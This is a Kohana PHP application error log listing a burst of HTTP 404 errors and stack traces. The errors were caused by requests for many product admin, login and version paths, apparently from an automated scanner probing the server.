2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CHANGELOG.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CHANGELOG.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL lms/db was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL lms/db was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:48 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/reports/status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:48 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/reports/status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/reports/status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/reports/status was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/reports/updates was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/reports/updates was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pom.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pom.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:49 --- ERROR: Kohana_Exception [ 0 ]: Cannot create instances of abstract controller_config ~ SYSPATH/classes/kohana/request/client/internal.php [ 96 ]
2025-10-24 13:20:49 --- STRACE: Kohana_Exception [ 0 ]: Cannot create instances of abstract controller_config ~ SYSPATH/classes/kohana/request/client/internal.php [ 96 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pom.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pom.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webportal.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webportal.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: build.gradle ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: build.gradle ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL admin/reports/updates was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL admin/reports/updates was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webportal.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: webportal.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: workplace/home.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: workplace/home.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL pandora_console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL owa was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL pandora_console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL owa was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: css/eonweb.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: css/eonweb.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:49 --- ERROR: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
2025-10-24 13:20:49 --- STRACE: ErrorException [ 8 ]: Undefined index: HTTP_HOST ~ APPPATH/classes/common_config.php [ 335 ]
--
#0 /var/www/html/application/classes/common_config.php(335): Kohana_Core::error_handler(8, 'Undefined index...', '/var/www/html/a...', 335, Array)
#1 /var/www/html/application/bootstrap.php(477): require('/var/www/html/a...')
#2 /var/www/html/index.php(107): require('/var/www/html/a...')
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL versions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL versions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL p/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL p/login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL centreon/api/latest/platform/versions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL centreon/api/latest/platform/versions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: workplace/home.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: workplace/home.action ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL pandora_console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL pandora_console was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL centreon/api/latest/platform/versions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL centreon/api/latest/platform/versions was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v3/meta was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v3/meta was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL owa was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL owa was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: css/elfinder.min.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: css/elfinder.min.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/authLogin.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/authLogin.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:49 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:49 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL system/version/current was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL system/version/current was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/check-version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/check-version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: css/elfinder.min.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: css/elfinder.min.css ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL am_bin/amlogin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL am_bin/amlogin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL geoserver/web was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL geoserver was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL geoserver was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL am_bin/amlogin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL am_bin/amlogin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL system/version/current was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL system/version/current was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL i18n/component/JS was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL i18n/component/JS was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL api/v1/version was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/ui/login.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/ui/login.jsp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL hx/api/about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL hx/api/about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL i18n/component/JS was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL i18n/component/JS was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CHANGELOG.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: CHANGELOG.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL health was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL health was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL hx/api/about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL hx/api/about was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL login was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: MagicInfo/config.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: MagicInfo/config.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: plugin/webs_model_cfg.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: plugin/webs_model_cfg.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/authLogin.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:50 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: MagicInfo/config.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cgi-bin/authLogin.cgi ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:50 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: MagicInfo/config.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Main_Login.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Main_Login.asp ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:51 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/luci was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:51 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/luci was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-24 13:20:51 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cap.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-24 13:20:51 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: cap.js ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-24 13:20:51 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/luci was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-24 13:20:51 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/luci was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
